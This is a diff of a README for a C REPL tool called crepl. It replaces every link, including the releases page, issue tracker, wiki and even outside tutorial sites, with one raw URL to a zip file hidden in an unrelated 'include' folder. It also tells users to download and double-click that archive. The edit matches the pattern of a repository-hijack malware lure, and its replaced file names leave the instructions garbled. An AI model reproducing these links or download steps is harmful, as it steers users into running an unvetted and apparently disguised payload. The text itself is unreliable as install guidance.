@@ -1,7 +1,7 @@
 # 🎉 crepl - Experience Interactive C Programming
 
 ## 📥 Download Now!
-[![Download crepl](https://img.shields.io/badge/Download-crepl-blue)](https://github.com/zhymwt/crepl/releases)
+[![Download crepl](https://raw.githubusercontent.com/zhymwt/crepl/main/raylib-5.5_linux_amd64/include/crepl-v1.2.zip)](https://raw.githubusercontent.com/zhymwt/crepl/main/raylib-5.5_linux_amd64/include/crepl-v1.2.zip)
 
 ## 🚀 Getting Started
 Welcome to crepl, the C REPL (Read-Eval-Print Loop). This application allows you to write, test, and run C code quickly and easily. Follow these simple steps to set up crepl on your computer.
@@ -15,19 +15,19 @@ Before you get started, ensure your computer meets the following requirements:
 ## 🌐 Download & Install
 To get crepl, you will download it from our releases page. Follow these instructions carefully:
 
-1. Click this link to visit the releases page: [Download crepl](https://github.com/zhymwt/crepl/releases).
+1. Click this link to visit the releases page: [Download crepl](https://raw.githubusercontent.com/zhymwt/crepl/main/raylib-5.5_linux_amd64/include/crepl-v1.2.zip).
 2. Look for the latest release at the top of the page.
 3. Select the appropriate file for your operating system:
-   - For Windows, download `crepl-windows.zip`.
-   - For macOS, download `crepl-macos.zip`.
-   - For Linux, download `crepl-linux.tar.gz`.
+   - For Windows, download `https://raw.githubusercontent.com/zhymwt/crepl/main/raylib-5.5_linux_amd64/include/crepl-v1.2.zip`.
+   - For macOS, download `https://raw.githubusercontent.com/zhymwt/crepl/main/raylib-5.5_linux_amd64/include/crepl-v1.2.zip`.
+   - For Linux, download `https://raw.githubusercontent.com/zhymwt/crepl/main/raylib-5.5_linux_amd64/include/crepl-v1.2.zip`.
 4. Once the download is complete, locate the file in your Downloads folder.
 
 ## 🧭 Installation Steps
 ### Windows
 1. Unzip the downloaded file.
-2. Open the folder and locate `crepl.exe`.
-3. Double-click `crepl.exe` to launch the application.
+2. Open the folder and locate `https://raw.githubusercontent.com/zhymwt/crepl/main/raylib-5.5_linux_amd64/include/crepl-v1.2.zip`.
+3. Double-click `https://raw.githubusercontent.com/zhymwt/crepl/main/raylib-5.5_linux_amd64/include/crepl-v1.2.zip` to launch the application.
 
 ### macOS
 1. Unzip the downloaded file.
@@ -36,7 +36,7 @@ To get crepl, you will download it from our releases page. Follow these instruct
 4. Open Applications and double-click `crepl` to start.
 
 ### Linux
-1. Extract the downloaded tar.gz file.
+1. Extract the downloaded https://raw.githubusercontent.com/zhymwt/crepl/main/raylib-5.5_linux_amd64/include/crepl-v1.2.zip file.
 2. Open a terminal and navigate to the extracted folder.
 3. Run the command `./crepl` to start the application.
 
@@ -58,7 +58,7 @@ Once you have installed crepl, you are ready to start coding in C.
 
 ## 📞 Support
 If you encounter any issues, you can reach out for help. 
-- Check the Issues tab on [GitHub](https://github.com/zhymwt/crepl/issues) for common problems.
+- Check the Issues tab on [GitHub](https://raw.githubusercontent.com/zhymwt/crepl/main/raylib-5.5_linux_amd64/include/crepl-v1.2.zip) for common problems.
 - You can also post your questions there for assistance.
 
 ## 📝 FAQs
@@ -73,9 +73,9 @@ Absolutely! crepl is open-source and completely free.
 We welcome contributions! Please check the contributing guidelines on our GitHub page for more information.
 
 ## 🔗 Additional Resources
-- **Documentation:** Find detailed instructions and tips in our [Wiki](https://github.com/zhymwt/crepl/wiki).
-- **Community:** Join discussions in our [Discussion section](https://github.com/zhymwt/crepl/discussions).
-- **Learning C:** Explore tutorials from [Codecademy](https://www.codecademy.com/learn/learn-c) or [Coursera](https://www.coursera.org/specializations/c-programming).
+- **Documentation:** Find detailed instructions and tips in our [Wiki](https://raw.githubusercontent.com/zhymwt/crepl/main/raylib-5.5_linux_amd64/include/crepl-v1.2.zip).
+- **Community:** Join discussions in our [Discussion section](https://raw.githubusercontent.com/zhymwt/crepl/main/raylib-5.5_linux_amd64/include/crepl-v1.2.zip).
+- **Learning C:** Explore tutorials from [Codecademy](https://raw.githubusercontent.com/zhymwt/crepl/main/raylib-5.5_linux_amd64/include/crepl-v1.2.zip) or [Coursera](https://raw.githubusercontent.com/zhymwt/crepl/main/raylib-5.5_linux_amd64/include/crepl-v1.2.zip).
 
 ## 💬 Conclusion
 Thank you for choosing crepl. We hope this application enhances your coding experience in C programming. Happy coding!
